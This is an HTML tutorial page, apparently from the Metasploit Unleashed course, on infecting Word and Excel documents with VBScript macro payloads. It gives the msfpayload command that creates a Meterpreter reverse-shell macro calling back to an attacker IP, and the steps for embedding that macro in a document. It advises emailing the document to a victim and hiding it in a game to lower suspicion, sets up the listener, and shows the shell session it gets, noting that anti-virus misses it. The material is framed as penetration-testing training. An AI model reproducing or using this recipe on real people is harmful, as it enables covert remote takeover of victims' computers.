<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>VBScript Infection Methods</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">VBScript
Infection Methods</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Metasploit has a couple of built in
methods you can use to infect
Word and Excel documents with malicious Metasploit payloads. You can
also use your own custom payloads as well. It doesn't necessarily need
to be a Metasploit payload. This method is useful when going after
client-side attacks and could also be potentially useful if you have to
bypass some sort of filtering that does not allow executables and only
permits documents to pass through.
To begin, we first need to create our VBScript payload.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">root@bt4: # msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=8080 ENCODING=shikata_ga_nai V           <br>'Created by msfpayload (http://www.metasploit.com).<br>'Payload: windows/meterpreter/reverse_tcp<br>' Length: 290<br>'Options: LHOST=192.168.1.101,LPORT=8080,ENCODING=shikata_ga_nai<br><br>'**************************************************************<br>'*<br>'* This code is now split into two pieces:<br>'*  1. The Macro. This must be copied into the Office document<br>'*     macro editor. This macro will run on startup.<br>'*<br>'*  2. The Data. The hex dump at the end of this output must be<br>'*     appended to the end of the document contents.<br>...snip...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">As the output message, indicates,
the script is in 2 parts. The
first part of the script is created as a macro and the second part is
appended into the document text itself. You will need to transfer this
script over to a machine with Windows and Office installed and perform
the following:
</span>
<p style="color: rgb(0, 0, 0);">In Word or Excel 2003, go to Tools,
Macros, Visual Basic Editor, if
you're using Word/Excel 2007, go to View Macros, then place a name like
"moo" and select "create".
</p>
<p style="color: rgb(0, 0, 0);">This will open up the visual basic
editor. Paste the output of
the first portion of the payload script into the editor, save it and
then paste the remainder of the script into thel word document itself.
This is when you would perform the client-side attack by emailing this
Word document to someone.
</p>
<p style="color: rgb(0, 0, 0);">In order to keep user suspicion low,
try embedding the code in
one of the many Word/Excel games that are available on the Internet.
That way, the user is happily playing the game while you are working in
the background. This gives you some extra time to migrate to another
process if you are using Meterpreter as a payload.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Vbscript_01.png"
 class="image"><img alt="Vbscript 01.png"
 src="http://www.offensive-security.com/w/images/7/7d/Vbscript_01.png"
 width="448" height="367"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Here we give a generic name to the macro.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Vbscript_02.png"
 class="image"><img alt="Vbscript 02.png"
 src="http://www.offensive-security.com/w/images/b/b8/Vbscript_02.png"
 width="888" height="554"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Before we send off our malicious document to our victim, we first need
to set up our Metasploit listener.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">root@bt4:# msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=8080 E<br>[*] Please wait while we load the module tree...<br><br>                |                    |      _) |<br> __ `__ \   _ \ __|  _` |  __| __ \  |  _ \  | __|<br> |   |   |  __/ |   (   |\__ \ |   | | (   | | |<br>_|  _|  _|\___|\__|\__,_|____/ .__/ _|\___/ _|\__|<br>                              _|<br><br><br>       =[ metasploit v3.5.1-dev [core:3.5 api:1.0]<br>+ -- --=[ 677 exploits - 332 auxiliary<br>+ -- --=[ 215 payloads - 27 encoders - 8 nops<br>       =[ svn r11153 updated today (2010.11.25)<br><br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>LHOST =&gt; 192.168.1.101<br>LPORT =&gt; 8080<br>[*] Started reverse handler on 192.168.1.101:8080 <br>[*] Starting the payload handler...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now we can test out the document by
opening it up and check back to where we have our Metasploit
exploit/multi/handler listener:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">[*] Sending stage (749056 bytes) to 192.168.1.150<br>[*] Meterpreter session 1 opened (192.168.1.101:8080 -&gt; 192.168.1.150:52465) at Thu Nov 25 16:54:29 -0700 2010<br><br><u>meterpreter</u> &gt; sysinfo<br>Computer: XEN-WIN7-PROD<br>OS      : Windows 7 (Build 7600, ).<br>Arch    : x64 (Current Process is WOW64)<br>Language: en_US<br><u>meterpreter</u> &gt; getuid<br>Server username: xen-win7-prod\dookie<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Success! We have a Meterpreter shell
right to the system that
opened the document, and best of all, it doesn't get picked up by
anti-virus!!!
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Client_Side_Exploits"
 title="Client Side Exploits">Client-Side Exploits</a></div>
</body>
</html>
